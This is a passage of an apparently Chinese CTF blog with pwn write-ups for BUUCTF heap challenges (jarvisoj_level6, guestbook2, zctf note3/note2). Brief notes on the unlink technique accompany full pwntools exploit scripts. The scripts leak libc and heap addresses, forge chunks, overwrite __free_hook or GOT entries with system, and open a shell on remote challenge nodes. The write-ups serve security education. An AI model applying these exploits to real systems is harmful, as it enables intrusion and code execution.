class="number">4</span>,<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">4</span>,b<span class="string">&quot;a&quot;</span>*(<span class="number">0x13</span><span class="number">-8</span>)+p64(libc_base+one_gadget[<span class="number">3</span>])+p64(libc_base+libc.sym[<span class="string">&quot;realloc&quot;</span>]+<span class="number">2</span>)+b<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x18</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
<h3 id="jarvisoj-level6"><a href="#jarvisoj-level6" class="headerlink" title="jarvisoj_level6"></a>jarvisoj_level6</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#jarvisoj_level6">BUUCTF在线评测 (buuoj.cn)</a></p>
<p>下面题目的x86版本，需要注意的就是size问题，unlink是ptr-12和ptr-4</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./freenote_x86&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port = <span class="number">25857</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    x/20xw *0x804A2EC</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line">def add(content):</span><br><span class="line">    sla(b<span class="string">&quot;Your choice: &quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Length of new note: &quot;</span>,str(len(content)))</span><br><span class="line">    sa(b<span class="string">&quot;Enter your note: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">free</span>(index):</span><br><span class="line">    sla(b<span class="string">&quot;Your choice: &quot;</span>, b<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Note number: &quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line">    sla(b<span class="string">&quot;Your choice: &quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line">    sla(b<span class="string">&quot;Your choice: &quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Note number: &quot;</span>,str(index))</span><br><span class="line">    sla(b<span class="string">&quot;Length of note: &quot;</span>,str(len(content)))</span><br><span class="line">    sa(b<span class="string">&quot;Enter your note: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line">add(b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(b<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line">add(b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">show()</span><br><span class="line">ru(b<span class="string">&quot;0. &quot;</span>)</span><br><span class="line">libc_base=u32(ru(b<span class="string">&quot;\xf7&quot;</span>))+<span class="number">0xf7d5d000</span><span class="number">-0xf7f0d761</span></span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line">add(b<span class="string">&quot;a&quot;</span>*<span class="number">4</span>)</span><br><span class="line">show()</span><br><span class="line">ru(b<span class="string">&quot;0. aaaa&quot;</span>)</span><br><span class="line">heap_addr=u32(r(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line">ptr=heap_addr<span class="number">-0xc00</span></span><br><span class="line">payload=p32(<span class="number">0</span>)+p32(<span class="number">0x109</span>)+p32(ptr<span class="number">-12</span>)+p32(ptr<span class="number">-8</span>)</span><br><span class="line">add(payload)</span><br><span class="line">payload=p32(<span class="number">0</span>)*<span class="number">0x20</span>+p32(<span class="number">0x108</span>)+p32(<span class="number">0x88</span>)+p32(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">add(payload)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,p32(<span class="number">2</span>)+p32(<span class="number">1</span>)+p32(<span class="number">0x10</span>)+p32(ptr))</span><br><span class="line">edit(<span class="number">0</span>,p32(libc_base+next(libc.search(b<span class="string">&quot;/bin/sh\0&quot;</span>)))+p32(<span class="number">1</span>)+p32(<span class="number">4</span>)+p32(libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]))</span><br><span class="line">edit(<span class="number">1</span>,p32(libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h3 id="jarvisoj-guestbook2"><a href="#jarvisoj-guestbook2" class="headerlink" title="jarvisoj_guestbook2"></a>jarvisoj_guestbook2</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#jarvisoj_guestbook2">BUUCTF在线评测 (buuoj.cn)</a></p>
<p>题目的一些io处理是真的脑瘫，非常烦，而且malloc大小也有限制，必须是0x80的整数倍</p>
<p>返回给用户态的全部指向mem,但unlink要用到的假ptr必须是指向chunk,所以一般我们都需要在chunk里面伪造一个chunk,这样ptr就指向了假头</p>
<p>注意unsorted bin还有small bins分配的时候如果剩下的大小&lt;MINISZIE,就会直接一起返回，不会切割出来，不然会切割</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./guestbook2&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;2.23&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x4526A</span>, <span class="number">0x45216</span>, <span class="number">0xF02A4</span>, <span class="number">0xF1147</span>]</span><br><span class="line">elif <span class="string">&quot;2.27&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x4F2C5</span>, <span class="number">0x4F322</span>, <span class="number">0x10A38C</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    one_gadget = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port =<span class="number">26763</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    x/20xg *0x6020A8</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line">def add(content):</span><br><span class="line">    sla(b<span class="string">&quot;Your choice: &quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Length of new post: &quot;</span>,str(len(content)))</span><br><span class="line">    sa(b<span class="string">&quot;Enter your post: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">free</span>(index):</span><br><span class="line">    sla(b<span class="string">&quot;Your choice: &quot;</span>, b<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Post number: &quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line">    sla(b<span class="string">&quot;Your choice: &quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line">    sla(b<span class="string">&quot;Your choice: &quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Post number: &quot;</span>,str(index))</span><br><span class="line">    sla(b<span class="string">&quot;Length of post: &quot;</span>,str(len(content)))</span><br><span class="line">    sa(b<span class="string">&quot;Enter your post: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line">add(b<span class="string">&quot;a&quot;</span>)#<span class="number">0</span></span><br><span class="line">add(b<span class="string">&quot;a&quot;</span>)#<span class="number">1</span></span><br><span class="line">add(b<span class="string">&quot;a&quot;</span>)#<span class="number">2</span></span><br><span class="line">add(b<span class="string">&quot;a&quot;</span>)#<span class="number">3</span></span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line">add(b<span class="string">&quot;\n&quot;</span>)#<span class="number">2</span></span><br><span class="line">show()</span><br><span class="line">ru(b<span class="string">&quot;2. &quot;</span>)</span><br><span class="line">libc_base=u64(ru(b<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>,b<span class="string">&quot;\0&quot;</span>))+<span class="number">0x7fb369673000</span><span class="number">-0x7fb369a37b0a</span></span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line">add(b<span class="string">&quot;a&quot;</span>*<span class="number">8</span>)#<span class="number">0</span></span><br><span class="line">show()</span><br><span class="line">ru(b<span class="string">&quot;0. aaaaaaaa&quot;</span>)</span><br><span class="line">heap_addr=u64(rld().ljust(<span class="number">8</span>,b<span class="string">&quot;\0&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line">ptr=heap_addr<span class="number">-0x17f0</span></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)+p64(ptr<span class="number">-0x18</span>)+p64(ptr<span class="number">-0x10</span>)</span><br><span class="line">add(payload)</span><br><span class="line">paylaod=p64(<span class="number">0</span>)*<span class="number">16</span>+p64(<span class="number">0x110</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">add(paylaod)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">2</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0x20</span>)+p64(ptr))</span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+next(libc.search(b<span class="string">&quot;/bin/sh\0&quot;</span>)))+p64(<span class="number">1</span>)+p64(<span class="number">0x8</span>)+p64(libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]))</span><br><span class="line">edit(<span class="number">1</span>,p64(libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line">it()</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h3 id="zctf-2016-note3"><a href="#zctf-2016-note3" class="headerlink" title="zctf_2016_note3"></a>zctf_2016_note3</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#zctf_2016_note3">BUUCTF在线评测 (buuoj.cn)</a></p>
<p>题目很简单，可以通过多分配堆直接修改掉bss保存的size，然后就是unlink就好</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./zctf_2016_note3&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port =<span class="number">25697</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    x/9xg 0x6020C0</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line">#&lt;=<span class="number">1024</span></span><br><span class="line">def add(size,content):</span><br><span class="line">    sla(b<span class="string">&quot;option---&gt;&gt;\n&quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;ength of the note content:(less than 1024)\n&quot;</span>,str(size))</span><br><span class="line">    sla(b<span class="string">&quot;Input the note content:\n&quot;</span>,content)</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">def <span class="built_in">free</span>(index):</span><br><span class="line">    sla(b<span class="string">&quot;option---&gt;&gt;\n&quot;</span>, b<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Input the id of the note:\n&quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line">    sla(b<span class="string">&quot;option---&gt;&gt;\n&quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Input the id of the note:\n&quot;</span>,str(index))</span><br><span class="line">    sla(b<span class="string">&quot;Input the new content:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">0x18</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">0x88</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">0x18</span>,b<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">4</span>,<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x18</span>,b<span class="string">&quot;a&quot;</span>*<span class="number">0x18</span>)</span><br><span class="line">ptr=<span class="number">0x6020c8</span></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x41</span>)+p64(ptr<span class="number">-0x18</span>)+p64(ptr<span class="number">-0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x40</span>)+p64(<span class="number">0x90</span>))</span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(ptr+<span class="number">8</span>)+p64(elf.got[<span class="string">&quot;free&quot;</span>])+p32(elf.got[<span class="string">&quot;puts&quot;</span>]))</span><br><span class="line">edit(<span class="number">1</span>,p32(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p8(<span class="number">0</span>))</span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line">libc_base=u64(ru(b<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>,b<span class="string">&quot;\0&quot;</span>))-libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">edit(<span class="number">1</span>,p32(system_addr&amp;<span class="number">0xffffffff</span>)+p16((system_addr&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffff</span>))</span><br><span class="line"><span class="built_in">free</span>(<span class="number">3</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h3 id="zctf2016-note2"><a href="#zctf2016-note2" class="headerlink" title="zctf2016_note2"></a>zctf2016_note2</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#zctf2016_note2">BUUCTF在线评测 (buuoj.cn)</a></p>
<p>这个题目总体不难，大概也能猜到漏洞在哪里，就是因为是strcpy的原因，要考虑到\x00截断</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656844294802-e0ff0aa3-a326-4b0b-a004-356ddff14d1a.png#averageHue=%23fcfcfb&clientId=u9d5fd636-f51f-4&from=paste&height=154&id=u540c7826&originHeight=193&originWidth=933&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36574&status=done&style=none&taskId=uc9166c51-1c54-4126-90ab-7b413584c83&title=&width=746.4" alt="image.png"></p>
<p>这里+14是因为data从14开始，v5-strlen(dest)就是判断剩下还有多少空余，由于read函数里面的长度&lt;v5所以一般的长度都不行，除了size0</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">#  -*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./note2&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port =<span class="number">29174</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    b *0x400F1C</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    x/xg  0x602160</span></span><br><span class="line"><span class="string">    x/4xg 0x602120</span></span><br><span class="line"><span class="string">    x/4xg 0x602140</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">    sla(b<span class="string">&quot;option---&gt;&gt;\n&quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Input the length of the note content:(less than 128)\n&quot;</span>,str(size))</span><br><span class="line">    sla(b<span class="string">&quot;Input the note content:\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">free</span>(index: <span class="type">int</span>):</span><br><span class="line">    sla(b<span class="string">&quot;option---&gt;&gt;\n&quot;</span>, b<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Input the id of the note:\n&quot;</span>, str(index).encode())</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">     sla(b<span class="string">&quot;option---&gt;&gt;\n&quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">     sla(b<span class="string">&quot;Input the id of the note:\n&quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line">OVERWRITE=<span class="number">1</span></span><br><span class="line">APPEND=<span class="number">2</span></span><br><span class="line">def edit(index,chocie,content):</span><br><span class="line">    sla(b<span class="string">&quot;option---&gt;&gt;\n&quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Input the id of the note:\n&quot;</span>,str(index))</span><br><span class="line">    <span class="keyword">if</span> chocie==OVERWRITE:</span><br><span class="line">        sla(b<span class="string">&quot;do you want to overwrite or append?[1.overwrite/2.append]\n&quot;</span>,b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        